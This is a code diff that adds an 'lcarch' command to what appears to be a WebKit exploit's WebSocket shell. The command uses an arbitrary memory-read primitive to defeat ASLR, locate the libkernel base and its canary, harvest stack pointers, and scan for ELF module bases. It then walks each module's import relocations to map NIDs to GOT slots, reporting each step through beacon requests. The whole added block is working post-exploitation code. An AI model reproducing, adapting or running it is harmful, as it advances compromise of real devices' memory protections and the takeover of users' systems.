@@ -5949,6 +5949,188 @@ function _startWsShell(){
         break;
       }
 
+      case 'lcarch':{
+        /* THE ALL-IN-ONE (the cross-session-marching lesson): harvest ->
+         * cluster -> march (top-down ELF-magic, in-page, per-step beacons)
+         * -> on any hit: the FULL import walk (NID <-> GOT <-> lk RVA)
+         * -> reply the map. ONE command, ONE session, every step banked.
+         * Bases are per-process ASLR (lk/WebKit moved every session -
+         * the 0x80EC08Exx march died cross-session); the ONLY durable
+         * artifact = the snippet RVAs. msg.deep = chunks below pg (def 6).
+         * The march risk: a garbage cluster's first read may die - all
+         * progress beacons first (the harvest values, cluster stats,
+         * march steps). The import walk reads only the VERIFIED module. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LA(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfrA=S.cfr;
+          /* lk chain */
+          var lkLoA=0n,lkHiA=0n,lkBA=0n;
+          {
+            var entA=S.absRead(0x10001c8000n,0x100);
+            var trPA=0n;
+            for(var eiA=0;eiA<entA.length;eiA++){if(entA[eiA]>=0x10001f0000n&&entA[eiA]<0x1000200000n){trPA=entA[eiA];break;}}
+            if(trPA===0n){reply.err='no thread-record ptr';break;}
+            var trA=S.absRead(trPA,0x60);
+            var ptA=0n;
+            for(var tiA=0;tiA<trA.length;tiA++){if(trA[tiA]>=0x880000000n&&trA[tiA]<0x900000000n){ptA=trA[tiA];break;}}
+            if(ptA===0n){reply.err='no pthread ptr';break;}
+            var ndA=ptA,qA=0n;
+            for(var hpA=0;hpA<5;hpA++){
+              var ppA=S.absRead(ndA,0x60);
+              qA=ppA[8];
+              if((qA&0x3fffn)===0x218n&&qA>0x800000000n)break;
+              ndA=qA-0x38n;
+            }
+            if((qA&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+            lkBA=qA-0x6C218n;
+            if(lkBA%0x4000n!==0n){reply.err='lk base unaligned';break;}
+            var canA=S.absRead(lkBA+0x751D0n,8)[0];
+            LA('1 lk=0x'+lkBA.toString(16)+' canary=0x'+canA.toString(16));
+            if(!(canA>0x1000000n)){reply.err='canary fail';break;}
+            lkLoA=lkBA;lkHiA=lkBA+0x200000n;
+          }
+          reply.lk='0x'+lkBA.toString(16);
+          /* harvest: stk band + deep chunks (v4 logic, compact) */
+          function foreign(v){
+            if(v<0x100000000n||v>=0x10000000000n)return false;
+            if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))return false;
+            if(v>=lkLoA&&v<lkHiA)return false;
+            if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)return false;
+            if(cfrA&&(v>cfrA-0x100000n&&v<cfrA+0x100000n))return false;
+            if(v>=0x10001c0000n&&v<0x1000210000n)return false;
+            if(v>=0x880000000n&&v<0x900000000n)return false;  /* pthread band */
+            return true;
+          }
+          var vals=[],seenA={};
+          function collect(start,len,tag){
+            for(var off=0;off<len;off+=0x1000){
+              var ws;
+              try{ws=S.absRead(start+BigInt(off),0x1000);}catch(e){LA('c THROW '+tag+'@+0x'+off.toString(16));return;}
+              for(var wi=0;wi<ws.length;wi++){
+                var v=ws[wi];
+                if(!foreign(v))continue;
+                var k=v.toString(16);
+                if(seenA[k])continue;
+                seenA[k]=1;vals.push(v);
+                LA('v'+tag+' 0x'+v.toString(16));
+              }
+            }
+          }
+          var pgA=(cfrA/0x4000n)*0x4000n;
+          collect(pgA,0x8000,'s');
+          var deepA=parseInt(msg.deep)||6;
+          for(var dchA=1;dchA<=deepA;dchA++){
+            try{collect(pgA-BigInt(dchA*0x1000),0x1000,'d'+dchA);}catch(e){}
+          }
+          LA('2 harvest n='+vals.length);
+          /* cluster: sort, gap>0x100000 splits; keep >=3 members */
+          vals.sort(function(a,b){return a<b?-1:(a>b?1:0);});
+          var cls=[],curA=[];
+          for(var viA=0;viA<vals.length;viA++){
+            if(curA.length&&vals[viA]-curA[curA.length-1]>0x100000n){cls.push(curA);curA=[];}
+            curA.push(vals[viA]);
+          }
+          if(curA.length)cls.push(curA);
+          var good=[];
+          for(var ciA=0;ciA<cls.length;ciA++)if(cls[ciA].length>=3)good.push(cls[ciA]);
+          LA('3 clusters total='+cls.length+' good='+good.length);
+          /* march each good cluster: top-down from clusterMin&~0x3FFF,
+           * max 80 steps (0x140000), stop at ELF magic */
+          var found=null;
+          for(var gi=0;gi<good.length&&!found;gi++){
+            var mn=good[gi][0];
+            var top=(mn/0x4000n)*0x4000n;
+            LA('4 cluster'+gi+' min=0x'+mn.toString(16)+' n='+good[gi].length+' march from 0x'+top.toString(16));
+            for(var st=0n;st<=80n&&!found;st++){
+              var C=top-st*0x4000n;
+              if(C<mn-0x140000n)break;
+              var mg=S.absRead(C,8)[0];
+              var mgL=Number(mg&0xFFFFFFFFn);
+              LA('5 C=0x'+C.toString(16)+' w0=0x'+mg.toString(16));
+              if(mgL===0x464C457Fn){found=C;LA('6 *** ELF HIT C=0x'+C.toString(16)+' ***');break;}
+            }
+          }
+          if(!found){reply.err='no ELF hit in '+good.length+' clusters';break;}
+          reply.elfBase='0x'+found.toString(16);
+          /* the import walk (lcnid logic, same run) */
+          var C=found;
+          var eh=S.absRead(C,0x40);
+          var phoff=eh[4];
+          var phentsize=Number((eh[5]>>48n)&0xFFFFn);
+          var phnum=Number(eh[6]&0xFFFFn);
+          LA('7 phoff=0x'+phoff.toString(16)+' phnum='+phnum);
+          if(phnum<1||phnum>64||phentsize!==0x38){reply.err='phdrs implausible';break;}
+          var dynV=0n;
+          for(var pi=0;pi<phnum;pi++){
+            var ph=S.absRead(C+phoff+BigInt(pi*0x38),0x38);
+            if(Number(ph[0]&0xFFFFFFFFn)===2){dynV=C+ph[2];break;}
+          }
+          if(dynV===0n){reply.err='no PT_DYNAMIC';break;}
+          var strtab=0n,symtab=0n,jmprel=0n,pltrelsz=0n,rela=0n,relasz=0n,syment=24n;
+          var dw=S.absRead(dynV,0x500);
+          for(var di=0;di+1<dw.length;di+=2){
+            var tag=dw[di],val=dw[di+1];
+            if(tag===0n)break;
+            if(tag===5n)strtab=val;else if(tag===6n)symtab=val;else if(tag===23n)jmprel=val;
+            else if(tag===2n)pltrelsz=val;else if(tag===7n)rela=val;else if(tag===8n)relasz=val;else if(tag===11n)syment=val;
+          }
+          if(strtab===0n||strtab>0x800000n||symtab===0n||symtab>0x800000n){reply.err='dyn implausible';break;}
+          LA('8 str=0x'+strtab.toString(16)+' sym=0x'+symtab.toString(16)+' jmp=0x'+jmprel.toString(16)+'+'+pltrelsz.toString(16)+' rela=0x'+rela.toString(16)+'+'+relasz.toString(16));
+          var slots=[],offsA=[];
+          if(jmprel!==0n&&pltrelsz>0n&&pltrelsz<0x4000n)offsA.push([jmprel,pltrelsz]);
+          if(rela!==0n&&relasz>0n&&relasz<0x20000n)offsA.push([rela,relasz]);
+          var seenSlotA={};
+          for(var oi=0;oi<offsA.length;oi++){
+            var baseR=offsA[oi][0],lenR=Number(offsA[oi][1]);
+            var rw=S.absRead(C+baseR,Math.min(lenR,0x20000));
+            for(var ri=0;ri+2<rw.length;ri+=3){
+              var rOff=rw[ri],rInfo=rw[ri+1];
+              var sym=Number(rInfo>>32n);
+              var typ=Number(rInfo&0xFFFFFFFFn);
+              if(typ!==6&&typ!==7)continue;
+              if(rOff===0n||seenSlotA[rOff.toString(16)])continue;
+              seenSlotA[rOff.toString(16)]=1;
+              slots.push({rOff:rOff,sym:sym});
+              if(slots.length>=240)break;
+            }
+            if(slots.length>=240)break;
+          }
+          LA('9 slots='+slots.length);
+          var out=[];
+          for(var si2=0;si2<slots.length;si2++){
+            var symA=C+symtab+BigInt(slots[si2].sym*Number(syment));
+            var se=S.absRead(symA,0x18);
+            var stName=Number(se[0]&0xFFFFFFFFn);
+            if(stName===0)continue;
+            var strA=C+strtab+BigInt(stName);
+            if(strA<C||strA>C+0x800000n)continue;
+            var sb=S.absRead(strA,12);
+            var bytes=[];
+            for(var q8=0;q8<sb.length;q8++){var w8=sb[q8];for(var k7=0;k7<8;k7++)bytes.push(Number((w8>>BigInt(k7*8))&0xFFn));}
+            var nid='';
+            for(var k8=0;k8<12;k8++){if(bytes[k8]===0)break;nid+=String.fromCharCode(bytes[k8]);}
+            var gotV=S.absRead(C+slots[si2].rOff,8)[0];
+            var rva=(gotV>lkBA)?Number(gotV-lkBA):-1;
+            out.push({nid:nid,got:'0x'+slots[si2].rOff.toString(16),lkRva:'0x'+rva.toString(16)});
+          }
+          reply.imports=out;
+          reply.n=out.length;
+          var checks=[],okc=0;
+          var WANT={'0x3f0':'U5VD1P181iA','0x410':'t1BJfub8VdY','0xb50':'n88vx3C5nW8'};
+          for(var ci2=0;ci2<out.length;ci2++){
+            var w=WANT[out[ci2].lkRva.toLowerCase()];
+            if(w){var good2=(out[ci2].nid===w);checks.push(out[ci2].lkRva+'->'+out[ci2].nid+(good2?' OK':' MISMATCH'));if(good2)okc++;}
+          }
+          reply.cross=checks;reply.crossOk=okc;
+          var tcE=null;
+          for(var ti3=0;ti3<out.length;ti3++)if(out[ti3].nid==='Tidr0SYRmB4')tcE=out[ti3];
+          reply.thrCreate=tcE;
+          LA('10 imports='+out.length+' cross='+okc+'/3 thr_create='+(tcE?tcE.lkRva:'NOT FOUND'));
+        }catch(e2){reply.err='lcarch fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'lcelf':{
         /* THE TOP-DOWN BASE PROBE: read C+0..0x20 - if ELF magic
          * (0x464C457F) -> C is a module base. Fire candidates
